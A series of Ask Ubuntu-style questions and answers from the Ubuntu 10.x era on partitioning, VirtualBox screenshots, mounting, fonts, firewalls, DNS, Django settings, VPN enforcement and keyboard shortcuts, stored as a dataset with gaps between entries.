: 50.4 GB)\n\n\n\nSo, I want to perform a Dual-boot installation on my PC, so that Ubuntu resides in the free disk space G:. \nTherefore, I started the Ubuntu 10.10 installation and select the manual partitioning feature in the installation.\nHowever, in the 'Allocate Drive Space' section of the installation, following partitions information is displayed: \n\n\n*\n\n*Partition        Type                     Size                 Used\n\n*/dev/sda \n\n\n*\n\n*/dev/sda1           1 MB     unknown\n\n*/dev/sda2        ntfs                      208 MB                 unknown\n\n*/dev/sda3         ntfs                      244813 MB              168540 MB\n\n*/dev/sda4        ntfs                      255083 MB              3221 MB\n\n\n\nwhere /dev/sda  - 500 GB\nSo, what exactly is the problem?\nWhat is it should I do to install Ubuntu 10.10 in the G: disk space?\nWhy are the partitions not being shown as the way they should be?\nAny Suggestions.\nThank you for the help.\n\nA: I have often seen this after an installation of windows what has happened,for technical reasons,is windows C partition has been placed 1Mb in. normally this would not matter except in this case linux knows you can only have four partitions and that is what it shows.\nSolution delete the 1 MB partition grow C to fill it write to disk and reboot.  \n\nA: It seems all of your hard drive is allocated for (if you add all the space it becomes about 500 GB) mainly in sda3 and sda4.

So, taking in consideration what Javier Rivera says, the reason of why it is needed to use SHIFT+CTRL in a terminal, is because of some of these combinations are used in terminal command's control.\nIn example: when you wish to \"cancel\" the current command, you pŕess CTRL+C, which is used in the majority of the systems to perform the \"Copy\" task. This way, if you press CTRL+C in a terminal in order to \"Copy\" a portion of text and an application or process is running, you will \"cancel\" the process or \"close\" the running application.\n\nDepending on the GUI that you use, or the software application itself, SHIFT+CTRL is useful for formatting or performing the \"special-paste\" task, which allow you to choose the format on which the copied text will be dropped into the application. \nIn example: if you use OpenOffice Word Processor or Spreadsheet, when SHIFT+CTRL+V you will be prompted to choose what format will you use for the clipboard to be dropped into the document.\nThe next image illustrates how the CTRL-V and SHIFT+CTRL+V keys drops the clipboard's content into a document:\n\nThe next image illustrates how the CTRL-V and SHIFT+CTRL+V keys drops the clipboard's content into a document, AFTER CHOOSING THE FORMAT in the right side documen:\n\nIn certain cases, as code (html, php, javascript) editors, you can choose between pasting the portion of text copied from a website or the code that generates the text in the website. In example: when copying from a formatted table, you can choose to paste the text in the table or to paste the code for generating the table into a web.\nYou should check into the application's \"Edit\" menu in order to see how the \"Paste special\" task is handled.\nThe next image illustrates how OpenOffice Word Processor handles the \"Paste Special\" feature:\n\n\nA: There are two types of clipboards in Unix/Linux: PRIMARY (often used with Ctrl-X/C/V) and SELECTION (mouse selected text, inserted with Shift-Insert or clicking the mouse middle button).\nSee https://wiki.archlinux.org/index.php/clipboard for more details.\n\nA: Here's what I used to do: \nCtrl+Insert : Copy to the clipboard\nShift+Insert : PASTE from the clipboard\nShift+Delete : Cut TO the clipboard\nNow I have an Apple Keyboard, I do:\n(The apple keyboard does not have an insert key)\nCtrl+C to Copy to the clipboard\nCtrl+V to PASTE FROM the clipboard\nShift+Delete to cut TO THE clipboard. \nIn a terminal using Putty:\nSelect the text with the mouse copies directly to the clipboard\nRight-Clicking anywhere in the terminal window does the paste\nIn a regular shell session:\nI select with the mouse, and use Ctrl+Shift+C to COPY to clipboard\nI use Ctrl+Shift+V to paste.\n\nA: As far as I know I use always CRTL+V to paste but when I'm in the terminal. For historical reasons CTRL+letter can't be used there, so I use SHIFT+CTRL+V in terminal.\nI always believe that Shitf+Insert is an heritage from older Unix keep them to get old timers comfortable, but that modern GUIs use CTRL+V as default.\n", "Q: How to take screenshot on Ubuntu-guest (Virtualbox) I am running Ubuntu 10.10 amd64 in a Virtualbox on windows host. whenever i try to take a screenshot by pressing the print screen or by launching the gnome-screenshot option the screenshot appears completely black.\nany idea how to get a screenshot inside the Virtualbox?\n\nA: VirtualBox provides a menu option to take screenshots of the guest, View --> Take Screenshot (Host+E). Alternatively, just Host + E (that's usually Right Ctrl + E).\n\nA: In Ubuntu guest go to System -> Preferences -> Keyboard Shortcuts. On the following window define a new shortcut to take a screenshot (e.g. in this example ShiftAltP):\n\nThenafter a screenshot will be taken whenever you press your keyboard shortcut. The default setting using Print is not available in the guest (host only).\nTaking screenhots will not work with desktop effects activated, i.e. when Compiz is running (see here for reference).\n\nA: A workaround would be to switch to windowed mode and take a screenshot of the VM window contents from the host OS.\n\nA: Ok guys! I have found out the problem and the solution. :P\nThe problem is Compiz and the solution is to disable it using the command:\nmetacity --replace &\n\nNow, I can take screenshot of any window inside the VirtualBox.\n\nA: I'm on windows 7 and you can use the snipping tool to take screenshots on ubuntu guest. I'm on a dual monitor setup though.\n\nA: I'm on Windows 7 running Ubuntu 11.10 on VirtualBox. Taking screenshots doesn't work for me either, but here's a workaround:\nPress [Host Key] + Alt + Print Screen.\nYou can now access the screenshot from the host's (Windows) clipboard. The Host Key is by default Right Ctrl.\n\nA: In VirtualBox 4.2.6 with Windows7-host and Ubuntu12.10-guest, I took correct screen shots before installing Guest Addition tools. After this, I get only black screens and desktop background image.\nAfter disabling VirtualBox 3D acceleration in VM configuration, the problem seems to be gone.\nNow I can use PrintScreen to take the full screen and Alt + PrintScreen to take a window screen shot through the gnome default capture utility.\n\nA: for linux host\nDisable \"Auto capture keyboard\" from virtualbox preferences.\nMain virtualbox window (not running guests) -> File -> Preferences -> Input -> Unselect \"Auto capture keyboard\"\n", "Q: Cisco VPN connection using CertStore as in Windows In Windows I was using Cisco VPN client to connect with VPN.

I've already created a nice webm encoding but can't create the equivalent mp4 video.\nThe MP4 option in Pitivi says it's not recommended and produces corrupted MP4 video when I use it. It recommends using mp4mux to render the project instead, but I can't find this option anywhere and Google is failing me.\nHow do I enable mp4mux rendering of MP4 in Pitivi?\n\nA: Even if this may not give the right answer to your question, I put my answer here as requested by djeikyb: \nTranscoding may be useful for you. \nYou render your video in whatever lossless format you wish (AVI, MPG, etc.) and transcode it changing the video bit rate in order to make it usable for HTML5  tag. Further information and a GUI I gave when answering this: How can I maximum compress video files? which I paste here for your convenience.\nGood Luck!\n\nWOW!\nH264 is a high quality video codec but\n  (as you refer), it makes \"heavy\" size\n  video files.\nI am not sure if your question is\n  related to a GUI or Command Line task.\n  But, assumming that you are using\n  \"Transmaggedon\" I will write this\n  considering the options for GUI\n  applications.\nIn my case, I prefer the usage of\n  \"Mobile Media Converter\" which works\n  pretty fine in 32bit systems (both\n  Ubuntu and MS based systems).\n  Unfortunatelly, it has its own\n  problems in 64 bit systems.\nWhat you wish is to make smaller size\n  video files. Which can be done by\n  changing the \"video bit rate\", which\n  will give you the best quality,\n  according to the video bit rate you\n  request. In example: a 40MB video file\n  (uncompressed, AVI) will fit in a 5MB\n  video file (any codec) if you use a\n  800kbps video bit rate. But -of\n  course- it may harm the quality.\nI strongly suggest you to perform some\n  testing using the Mobile Media\n  Converter, which can be reached (.deb)\n  by clicking the next link: \nhttp://www.miksoft.net/mobileMediaConverter.htm\nAfter installing, just drop any video\n  files (preferably small for the test)\n  into the drag and drop area, then open\n  the Advanced options by clicking a\n  small arrow that is placed at the very\n  right of the window, below the\n  \"browse\" button. \"[ ... ]\"\nNext, click in \"Advanced\" and you will\n  have all the options that you need in\n  order to transcode your video and make\n  small and good quality\n  transcodification.\nRemember: The higher video bit rate\n  is, you will have better quality but\n  the file size will become \"heavier\".\nBTW: You can also transcode videos by using a non linear editing system,\n  such as \"Kdenlive\"\n  (http://www.kdenlive.org/) or\n  \"Openshot\"\n  (http://www.openshotvideo.com/) and\n  many more. A non linear editing system\n  will also be useful to edit the video\n  (trim, crop, add text and more).\nGood luck!\nHere is a screenshot for you to see a\n  few options of Mobile Media Converter\n  in action.\n\n\n", "Q: Installing alongside Win7; entire disk shows as unallocated I am trying to install 10.10 along with a Win7 installation, but I can't. When I run the installer it says that the entire disk is free (unallocated). If I try to run the \"Try Ubuntu\" thing instead, it can access the other partition(s), but when I run GParted it will say the disk is free.\nI've read somewhere this is due to buggy GPT support; but does anyone know who to fix this?\n\nA: Parted, which is used by Ubuntu's installer, generally complains when you try to list partitons on a drive whose partition table is in some way invalid. Unfortunately the error from libparted isn't displayed by either Ubuntu's installer or GParted. Instead, because of the error, they get no information about the existing partitions and these front ends act as if the drive is not partitioned at all. You'll need to determine what is wrong with your partition table and fix it before attempting to install Ubuntu. That is why I asked you to post the output of sudo parted -l, as parted will tell you what problem it has detected and from that we can help you fix it.\n\nA: I ran into a similar problem when I had primary partitions intertwined with logical partitions.(e.g.: primary partition, logical, primary).\nI solved it by moving the logical partition at the end of the partition table.You can do that with a Windows utility such as Acronis Disk Director or Partition Magic\n", "Q: Tuning my Ubuntu installation I'm using Ubuntu 10.10 and i'm interested in hearing a few tips on how to improve performance and tune my system to be faster. Any articles or links on this? Thanks in advance!\n\nA: Don't get me wrong, but don't try to optimise something if you don't even know where to start or if you don't have a specific issue.\nSeriously, Ubuntu is out of the box already very good compiled, there's hardly anything to do which would not require in-depth knowledge of the system (except changes for special hardware, like SSDs). If you'd want a better system performance, you'd need to re-compile and customise the kernel. If you'd want to speed up the boot, you'd have to mess GRUB2 and upstart.\nConcentrate on the important things, f.e. customisation of your work environment. Have a look at devils pie, conky and similar tools. And start messing with the system if you have to.\n\nA: Some links that could be helpful:\n\n\n*\n\n*http://www.zolved.com/synapse/view_content/28224/How_to_tune_your_Ubuntu_PC_for_faster_performance_\n\n*http://www.webupd8.org/2010/11/alternative-to-200-lines-kernel-patch.html\n", "Q: How can I set my resolution to 1280x1024 on an Acer Aspire Revo 3700? \nFINAL UPDATE: Here is the best solution that I found after going through this problem lots of times. The question below is outdated because as it turns out the computer is not the problem; the monitor is the problem.\n\nI've just set up a new nettop computer (Acer Aspire Revo 3700: CPU:Atom D525, GPU:Nvidia ION2). I've just made a clean install of Ubuntu 10.10 using the standard USB pendrive method. Almost everything works OK, but the graphics are not OK: the recommended Nvidia driver is activated but the monitor is not detected, so the resolution is wrong.\nHow can I make Ubuntu detect my monitor?\nHow can I get the proper resolution (1280x1024) in Ubuntu?\nI know that my monitor is not a CRT but an LCD: it's a BenQ, model T905, with 1280x1024 resolution at 60Hz, connected via a normal VGA cable. DVI or HDMI is not an option.\nWhen I go to System>Prefs>Monitors, I get:\n\nIt appears that your graphics driver\n  does not support the necessary\n  extensions to use this tool.  Do you\n  want to use your graphics driver\n  vendor's tool instead?\n  YES NO\n\nIf I say NO then I get a window:\n\nor for YES I get this:\n\nIn both cases I don't see that I can fix this problem. The main reason for getting this new computer was that I was sick of having graphics problems on the old one with a very ugly solution that didn't give me hardware support - but at least I got the resultion. Why is this so difficult... sigh!\n\nA: It's an EDID issue. Your monitor is trying to tell your graphics card which modes is supports (at various refresh rates) but one side of the conversation is failing.\nThe fix is fairly simple, you just manually tell the driver what modes you can work at. In this case it seems you can just set the refresh rates and it'll figure out the rest.\nhttps://superuser.com/questions/60290/cant-set-1280x1024-on-ubuntu-with-nvidia-geforce-8400-gs\n\nYou might also have more luck with a digital cable going from your Revo's HDMI port to your monitors DVI-D port. You can buy conversion cables or add-on dongles that change one end of a HDMI or DVI cable. Both options are quite cheap. You can get a 2m DVI-D=>HDMI for about £6.\n\nOn a sidenote, you only ever want to use nvidia-settings. The closed nvidia drivers aren't compatible with  the randr extensions... But that's not too bad as nvidia-settings isn't that bad.\n\nA: I am fighting with a similar problem.

I was trying to add the installed matlab to the menu of Applications under Ubuntu 10.10.\nI clicked Gnome-Menu -> Preference -> Main Menu -> Programming -> New Item, where I input the Matlab file .../MatlabR2010b/bin/matlab as the command, and selected the type to be \"Application\". Then I finished.\nBut when I click the item in the menu of Applications, the Matlab icon shows up for a few seconds and then nothing else happens.\nIf I select the type to be \"Application in Terminal\", then in the last step of adding Matlab to the Applications Menu, after I click the item in the menu of Applications, there will be firstly a terminal window and then the Matlab command window.\nSo I was wondering how to solve the problem of Matlab not starting when the type has been selected to be \"Application\"? Also is there a way to eliminate the terminal appearing when the type has been selected to be \"Application in Terminal\"?\n\nA: Its also nice to not have two icons in the launcher while MATLAB is running.  To accomplish this, edit the *.desktop file containing the launcher for MATLAB (grep for matlab in ~/.local/share/applications) add add the following line to the bottom\nStartupWMClass=com-mathworks-util-PostVMInit\n\n\nA: you need use -desktop parameter after the command which means you should write in command like bin/matlab -desktop.\n\nA: I found some useful instructions which work for me (Ubuntu 10.04).\n\n\n*\n\n*How to Install MATLAB on Ubuntu Linux\n\n*How do I create shortcuts, aliases, or links to MATLAB?

The best way to tell is to try head -1 .../MatlabR2010b/bin/matlab and see if it starts with #!/bin/sh or similar.\nIf it is a script you may wish to set your gnome menu entry to \"Application\" and setting the command to \n/bin/sh -c .../MatlabR2010b/bin/matlab\n\n\nA: Ok, try this:\nRight click on an empty part on your Gnome Panel, click Custom Application Launcher\nMake sure the entries are similar to the ones in the image.\n\nLet us know i it worked!\n", "Q: Device type \"loop\" in mount command I was wondering what \"loop\" mean in this usage of mount:\nmount -t iso9660 -o loop matlab.iso  /media/cdrom0\n\nIs it a type of device? What does this device type \"loop\" mean? Can I choose other device types for the iso file? Thanks!\n\nA: A \"loop\" device in Linux is an abstraction that lets you treat a file like a block device. It's specifically meant for a use like your example, where you can mount a file containing a CD image and interact with the filesystem in it as if it were burned to a CD and placed in your drive.\nYou can find more information on Wikipedia.\n\nA: The loop option to mount (it's not a type, it's an option) tells mount that this is a \"loopback\" device - a regular file to be used as a block device.\nIn the background, mount sets up a loopback device (/dev/loopX), then mounts that at /media/cdrom0.\n", "Q: cp command process info Is there any specific package for cp command which shows the process of being copied.\nI'm wondering if there is any package cp which shows additional information that what has been copied and what are left or how many percentage it has been copied...etc. Any body using any?\n\nA: You can use rsync to do the copy. If you use the -P option (show progress), it does just that.\nI tend to use rsync -avP <source> <dest> for most copying.\n\nA: You can pipe things into the pv command to add progress indication to programs that might not have their own progress meter. \ncp -a source/ dest/ | pv\n\nHowever if I'm doing a copy large enough that I need a progress bar I end up using rsync anyway as Jeremy recommends. He also points out that you'll need to arrange your pipeline so that the data is piped though pv - the example gives only tells you how much data the cp is printing out, not how much is being copied. Something like this will work for single files: pv source > dest. \nHowever, for copying directories, you'll need to get more complex. \n", "Q: How do you download a font and then install it? \nPossible Duplicate:\n How do I install fonts? \n\nto use for various stuff... thanks for the help.\n\nA: Most modern font types are really easy to install. If you're using 10.04 or newer, you should be able to open the font viewer by double clicking on the font, and simply clicking the \"install\" button.\nHowever, if you want to do it manually (sometimes it helps with organization), it's not much more difficult. All you have to do is move the font to your font directory and then update your cache.\nIf you look at the contents of /etc/fonts/fonts.conf, you can see all of the places where your fonts are stored. Personally, I like to put my fonts in /usr/share/fonts/, but that requires an account with sudo privileges (since the fonts are owned by 'root'). If you only need the font for a single user account, you can simply drag-and-drop the font into the ~/.fonts/ folder. If you can't find a ~/.fonts/ folder, no problem! Just use mkdir ~/.fonts to create it.\nOnce you've put your font(s) in the correct folder, open up a terminal and type:\nsudo fc-cache -f -v\nThis updates your font cache, and now your new fonts should be usable!\n\nA: Is it that difficult?\nWhat I do is to download the font file (ttf or whatever), to open it by double clicking on it then I click in the \"Install\" button which appears on the botton of the \"gnome-font-viewer application.\nThe font is immediately installed and ready to be used. Sorry if I misunderstood something in the question but it reads: \"How do you download a font and then install it?\"\nA screenshot is placed here to illustrate:\n\nBTW: There are several \"font viewer/manager\" which includes but not limits to: FontForge and KFontView (for KDE, also running in gnome)\nDepending on the source, the font file may be inside of a compressed file. Just extract it and you will get the ttf.\n", "Q: Is there any way to take my current setup and put it on a live disk, then install it to another machine? A tutorial or specific directions would be great.\n\nA: No, you cannot :)! (just kidding).\nThere is remastersys. It is highly documented, so I won't bother to re-document it here ^^!\nHere is a link: http://www.ubuntugeek.com/creating-custom-ubuntu-live-cd-with-remastersys.html\nKeep in mind this only keeps the software you have installed plus a few other bits and pieces. To get your home folder etc copied, you will need to manual transfer that data yourself, the instructions for which would be better off in another question/answer couple.\nMost of your settings will not be transfered automatically, except for what it stored in the system wide configuration. This is a limitation of the scripts used to create the live environment.\nTo counter this, you can copy your themes and icons to /usr/share/themes and /usr/share/icons respectively, as well as set the gconf entries for your gtk/icon/metacity themes using gconf-editor to default (sorry I could not capture the menu in my screenshot). (right click the entry, then click set as default)\n\nA more extensive option (sorry I could not find one of the the links I was looking for) is to create/customize a live cd (as according to this guide).\nAfter installing this system, you could \"make it like your existing system\" using a few commands.\nThe steps to this are described in detail here.\nNo matter what method you choose, always consider carefully, before attempting such an operation, and wherever possible, try to backup your critical data.\n", "Q: Is a Firewall really necessary these days? should I install something like gufw?\n\nA: Yes, more than ever. The internet hasn't changed a lot, since the old days. So a firewall is still a necessity these days. A firewall like gufw, with basic rules works. Use iptables, if you are a CLI geek ;)\n\nA: Please check this reply for furthur discussion on Firewalls on Ubuntu.\nWhy is the firewall disabled by default?\n\nA: Undoubtedly, it only takes a single opportunistic snooper to cause no end of trouble. The confusion lies in how you go about ensuring you're behind a firewall. \nThis is discussed in more detail here: Is there a preinstalled or automatic firewall? but in short if you are on a home network, behind a wireless router, then your router will normally be performing firewall duties. Obviously its a good idea to check with the manufacturer before you rely on anything (its also dependent on the router configuration).\nGUFW is not, in itself, a firewall, just a GUI for ubuntu's default firewall (UFW). UFW is switched off by default. Generally speaking, its advisable to only run one firewall, to avoid potential conflicts, so provided you are on a trusted home network  (and you're positive your router provides adequate protection), id advise switching off your software firewall (UFW).\nObviously, switch it back on again when you're on a public / non trusted network.\n\nA: I would recommend to install a firewall. Something is always better than nothing. isn't it?. Ubuntu , By default comes with a firewall 'ufw'. gufw(Mentioned in the question) is nothing but the GUI of 'ufw'. \nHope this helps.\n\nA: Ubuntu should come with a default firewall activated with a GUI tool too. I'm surprised it doesn't come with it. I know iptables is already there but there are no rules loaded. You have to do that manually or install something like Firestarter to get the basics running for you.\nI was so surprised one day when I found out that my ISP gives me my own public IP every time I enable my DSL. Imagine how many hits, ssh login attempts, other scans and MS exploits (yeah someone was running that on my ISP's IPs) my machine was getting the entire time. LOL! :)\n\nA: With the introduction of IPv6 having a firewall will become even more critical.  Unlike IPv4 where most systems are relatively secured on private IP ranges, IPv6 devices are likely to be fully accessible.\nHaving a firewall with a default deny policy will be even more critical.  Finding devices to scan will be more difficult due to the sparse use of addresses.  Keeping some protocols like SMB on link local addresses will help, but won't be a magic bullet. \nThat said in a default install an active firewall is just an extra layer of security.  Many of the applications which do open ports will require their ports to be opened to allow them to work.  Pretty well all have additional methods to secure them.  Enable all the appropriate layers as required.\nEDIT:  There have been a lot of comments about letting the application control access and other reasons not to have a firewall.  Unfortunately, many applications don't have access controls.  Others listen on all addresses, so a firewall becomes the sole way of restricting access from certain interfaces.  \nAs I noted above, a firewall is only one layer of security.  Secure applications are another, but you can't easily ensure that your users only run secure applications. A firewall is one way of protecting your users.  \nNo reasonable security measures are totally secure.  While many users may not be interested or educated enough to fully understand a firewall, that is not a reason not to use a firewall, or for them no to have a firewall.\n\nA: By definition a firewall blocks communication that otherwise would be allowed.  A desktop Ubuntu machine has no services installed by default that will accept connections, so there is nothing for a firewall to block access to.  Therefore, it is completely useless.\nThe reason a firewall is considered necessary on Windows is because it comes with several brain dead services installed by default that accept connections and allow the other party to do things with your computer that you don't want.\n\nA: Everyone is correct, be careful and probably use some kind of protection, it can create some hassle depending on what you do but sometimes you don't notice how much that extra hassle is really protecting you. \nOne way you could add some extra protection that isn't really intrusive at all would be to look into OpenDNS, basically just adds some nice control and extra security features for basic internet use. \n", "Q: Where can I find a Spotify .deb package? It appears to me that Spotify have released a Linux client... however every attempt I've made to get it from the repositries have failed.

I am using the alarm-clock application and the alarm-clock-applet, and the only frequency I can set, are for days of the week. I want an hourly alarm, is there any way to do that? Googling did not provide any answers, neither did AU, seems like no one has asked this question ever before. ATM, I use crontab to fire a notify-send each hour. Any other application/methods?\nThanks.\n\nA: Sounds like an App request to me Kaustubh or at least a feature request for alarm-clock. In the meantime if you don't understand cron you can use the gnome-schedule application to give you a gui way of adding your reminders.\nsudo apt-get install gnome-schedule\n\n\nA: You can use the below python script not only for setting an hourly alarm, but for setting an alarm with any time interval. Firstly create a new file alarm.py, using vi alarm.py . Then paste the following code in the file, \n#!/usr/bin/env python2\nimport pynotify\nfrom pygame import mixer\nfrom time import sleep\ndef sendmessage(title, message):\n    pynotify.init(\"Test\")\n    notice = pynotify.Notification(title, message)\n    notice.show()\n    return\nwhile True:\n    mixer.init() #you must initialize the mixer\n    alert=mixer.Sound('beep.wav') #name of the sound file is beep.wav\n    alert.play()\n    sendmessage(\"ALARM!!\", \"1 hour up!\")\n    sleep(3600)\n\nHere, beep.wav is the name of the sound file which should also be in the same directory as of the alarm.py file (preferably home folder). You can download any beep sound file of your choice from the internet.\nNow make the file executable by,\nchmod +x alarm.py\n\nNow to run this in background, \nnohup /home/'username'/alarm.py &\n\n(this is when alarm.py is in the home folder, use the appropriate file address as required) \nand hit Enter twice. \nNow this process will be running in background, if you want to stop this, type, \nps ax| grep alarm.py \n\nand type, \nkill process_id\n\nCurrently, the time interval is 1 hour. If you want to change it, change the line sleep(3600) to sleep(no_of_seconds) [IN this case, 3600 = 60*60 seconds = 1 hour.]\nHope it helped!\n\nA: Keyboard preferences has a typing break monitor that can be triggered hourly.  Doesn't trigger if you have breaks in your work.\nIf it doesn't fit your needs it may be a good starting point to develop your own alarm.\n", "Q: How to tell apt-get to install another version of Eclipse? apt-get installs Eclipse version 3.5 when I do this:\nsudo apt-get install eclipse-platform\n\nHowever I would like to install version 3.6.\nHow can I do that?\n\nA: You can tell apt to install a specific version as follows:\napt-get install package=version\n\nexample: \napt-get install eclipse-platform=3.5.2-6ubuntu1.1\n\nBut AFAIK the version 3.6 is not available in the repo. It is better to install manually . Check a similar thread here How to install Eclipse?\n\nA: Eclipse 3.5 is the latest version in repositories.apt-get installs the latest version automatically, so there is nothing to do with apt-get.\nInstead you can download eclipse 3.6 (Helios) from eclipse.org and use it.\n", "Q: /opt and /usr/local on the same partition but not under root I am planning to install Ubuntu on a new laptop soon.  I want to put /opt and /usr/local directories separately from the root and home partitions, but I don't need two partitions for them, just one.\nIs it possible to put these two directories on a single separate partition, preferably without using soft-links?  Following a soft-link requires path resolution, so I don't think it's a good idea to soft-link commonly-accessed top-level directories.\n\nA: I wouldn't say that symlink is a problem. It's already very bad if a symlink lookup affects the performance too much :) Also you may expect that it's cached, in a way that it won't be read from the disk each time, if it's really a \"commonly-accessed\" directory. But I think, /opt and /usr/local is not so much used on a standard Ubuntu install, /usr/local is used more for your own stuffs you compile from source (this is not the correct definition but usually this is the case), while /opt is used for \"optional\" softwares. But not so much softwares are installed there normally on Ubuntu, maybe some Google softwares for example, if I want to find an example. Anyway, even if these directories are heavily used, I wouldn't say that a symlink would mean lots of differencies, I would not worry if I were you.\nYou have another choice as well. Let's say you have a separated filesystem for /opt and /usr/local, for example /dev/sda6. Mount it as /opt. Create a directory inside /opt, let's say it's usrlocal. Then you can use VFS bind to \"mount a directory\" (not so correct notion technically but never mind ...) this way:\nmount --bind /opt/usrlocal /usr/local\nOf course you can put this into your /etc/fstab too, so you don't need to do this manually with a line like this in your /etc/fstab:\n/opt/usrlocal /usr/local none bind 0 0\n\nA: There's \"mount-binding\" where you mount one directory on another. E.g. if your second partition is mounted on /mnt/other, and you've created directories home, opt and local in it, then you can use mount like this\nmount -obind /mnt/other/home /home\n\nThe corresponding fstab entry would be\n/mnt/other/home /home none bind 0 0\n\n", "Q: My files disappeared from the UbuntuOne synced folder I set up an UbuntuOne account on PC1 (Ubuntu 10.10) and the same account on PC2 (Ubuntu 10.04).\nI did the following:\n\n\n*\n\n*Created file named maverick.txt in PC1's ~/Ubuntu One/log\n\n*Created file named venus.txt in PC2's ~/Ubuntu One/log\nBot files appeared in one.ubuntu.com\nA few hours later, those two files are disappeared from \n\n\n*\n\n*PC1's Ubuntu One/log\n\n*PC2's Ubuntu One/log\n\n*one.ubuntu.com\n\n\nSo, my files are gone forever.\nWhy did this happen?\nIs there any way to recover those files?\n\nA: I cant answer why Ubuntu One is failing.\nyou must run foremost from live cd otherwise you will lose deleted files (thanks for that comment!)\nI recommend DEFT Linux LiveCD\nTo recover files I recommend you foremost.

Check it out what's in your /etc/resolv.conf, is it the correct nameserver you want to use? I am not sure about your problem: on Ubuntu only chromium behaves like this, or other browsers too? It's not so useful to mention that it works with windows, since maybe you have different nameserver setting in windows, that's why it works there. What would be useful is to know if other browser(s) in Ubuntu work(s) or not. If you have the issue that you have wrong nameserver in /etc/resolv.conf, you should check how you got that: it's your setting, or got via DHCP etc etc. Also you can use terminal to try out some DNS lookup to see if it works there or not, like host www.google.com\n\nA: The error seams to be related to a hardware problem eg modem, router taking to long to resolve a web address it affects Chromium more than firefox as it probably has a slightly shorter time out before advising the name hasn't been found.\nYou can find out the current dns times by pining your dns server by using the ping function of the network tools something around 300ms is acceptable personally I use google's dns but I would recommend using Namebench (a dns testing program to find the fastest one for you) which you can get from getdeb.net if you use this program and you are still having difficulty's then I would talk to your ISP if they can change your modem.\nHope this helps\n", "Q: How to solve the DJANGO_SETTINGS_MODULE error? i installed wsgi, python, apache and django on my Ubuntu 10.04 but when i \ndjango-admin.py runserver\n\ni get this error\nError: Settings cannot be imported, because environment variable DJANGO_SETTINGS_MODULE is undefined.\n\nhow to solve this?any replies will be much appreciated.... and a step by step answers will be great,,,\n\nA: DJANGO_SETTINGS_MODULE.\nfunction setdsm() {\n    # add the current directory and the parent directory to PYTHONPATH\n    # sets DJANGO_SETTINGS_MODULE\n    export PYTHONPATH=$PYTHONPATH:$PWD/..\n    export PYTHONPATH=$PYTHONPATH:$PWD\n    if [ -z \"$1\" ]; then \n        x=${PWD/\\/[^\\/]*\\/}\n        export DJANGO_SETTINGS_MODULE=$x.settings\n    else    \n        export DJANGO_SETTINGS_MODULE=$1\n    fi\n\n    echo \"DJANGO_SETTINGS_MODULE set to $DJANGO_SETTINGS_MODULE\"\n}\n\nput this in  .bash_profile, then a quick setdsm sets the DJANGO_SETTINGS_MODULE to the settings.py in the current directory and add the current directory and it’s parent to PYTHONPATH.\nTaken from: http://www.juiceanalytics.com/writing/django_settings_module/ \nCheck this also: http://martinjansen.com/2008/10/20/django-settings-files-for-development-and-production/\nHope this helps.\n\nA: the problem is that you are trying to run django server using djang-admin.py runserver  script instead of ./manage.py runserver.

You can try to guess them (most removable stuffs are mounted into directories inside /media), but a nicer way to use the mount command within a shell, so you can see the mounted file systems. Then it's easy to check the directories you need to look (\"something on somewhere\" at every lines, look at \"somewhere\"). Also you can install a nautilus extension, in packages nautilus-terminal and nautilus-open-terminal, as far as I remember, one of these can open a terminal for you at the location where you are in nautilus, so you don't even need to use a single cd command to get there :) But anyway, if you're using nautilus you can navigate to the device's directory you are interested in, and the location bar will show you (or you may need to press CTRL-L then ...)\n\nA: It may be useful to do a 'disk free' check df -h - this should show where the main partition is mounted.

Connections initiated by your computer works. Some special protocols do not, for example you'll encounter problems with UDP. By dropping all incoming connections, active attacker from another network can't find your computer, except if you specifically open connection to attackers computer.\nIn LAN your computer is still broadcasting ARP packets. You can't prevent that, if you want it working connection.\nYou should also disable for example avahi-daemon, which is sending MDNS broadcasts.\n\nA: It's a bit hard in general, if you talk about on Ethernet level for example, you can hide your existence with not responding the ARP requests or don't answer, but then you can't use network either :) You need to \"advertise\" yourself otherwise networking won't work. Sure, you can hide some other things at least which can provide more \"attacking surface\" for others. You can use firewall, so others won't see your services, you may run on your computer, you can be careful avahi not advertise your presence, and so on. But I think it's hard to answer \"in general\".\n\nA: If you are communicating on the Ethernet or wireless you are open to sniffing.  At the very least your computer will announce its presence when it gets or sets an IP address. \nYou could try masquerading as another computer on the network, but that will make things difficult for you and the other computer.  Your traffic would still be open to sniffing.\nEncrypting your traffic will make it more difficult to determine what traffic you are sending to.  But the endpoints will still be visible. \n\nA: Perhaps a little low tech but I turn off my computer when I'm not using it. This is in addition to being behind a NAT wireless router with MAC filtering and a built in firewall. I also run a basic firewall in all my computers.

Unfortunately, at my university the connection is quite unstable and at every reconnect the VPN connection is terminated and I manually need to reconnect to it using the NetworkManager, which obviously only works if I notice the reconnect. I enabled the option to automatically connect to the VPN in the NM options, but it seems to have no effect.\nIs there a way to enforce an active VPN connection before any other application can access the network connection so I can be sure not to send private data over unencrypted connections?\nCheers,\nPascal\n\nA: You can use the Firestarter firewall tool to limit your outbound connections to the vpn host. It is very easy to configure, and you can toggle it on and off with a single button click.\nTo create such a setup, hit the Policy tab, choose Editing Outbound traffic policy, and select Restrictive by default, whitelist traffic. Then you right-click on the empty list below, and add the vpn host to the whitelist.\n\n\nA: Well, I dont know if there is a better way to do what you asked but a crude way would be just to manually delete the default route for your Wifi connection after you connect to VPN. This way when your VPN is disconnected traffic will not be able to leave your system as there will be no default route.\n", "Q: How to embed evince in firefox 4?

Whenever I try to set something like that it is just reset to \"Disabled\".\nA workaround is of course to use the numeric pad, but I'd like to be able to do this on my EEE laptop as well without enabling and disabling NumLock all the time.\n\nA: By design, it is not possible to create a keyboard shortcut that uses multiple non-modifier keys.\nImagine you've created shortcuts for both Super+Up and Super+Up+Left. When you press Super+Up, how will the computer know whether to execute the shortcut or keep waiting for more keys?\n\nA: I have not tried to set these to use the arrow keys in the Put plugin before, but I do not believe it is possible if compiz resets the keys. You may have to resort to using your normal number keys at the top of the keyboard.\nThe arrow keys work otherwise though.\n\nA: Using xchainkeys, you could define key sequences.\nFor an example, we use the same keys as in the answer of @ændrük;\nSuper+Up and Super+Up Left.\n(That is pressing two keys at the same time, and then one alone - not all three at once in his example: Super+Up+Left.)\nYou can define key sequences in xchainkeys in some variants, one way would be to define a group of key sequences starting with the same prefix - Super+Up in this case. \nThen pressing Super+Up only goes into a mode waiting for the next key (or timing out if you like). \nNow, we could define:\nSuper+Up Up\nSuper+Up Left\nSuper+Up Right\nPressing the same keys again would insert the keys as pressed one time by default.\nWith other options, we can use:\nSuper+Up Right Up Up\nwithout repeating the prefix key.\n", "Q: How to get freewins plugin working in 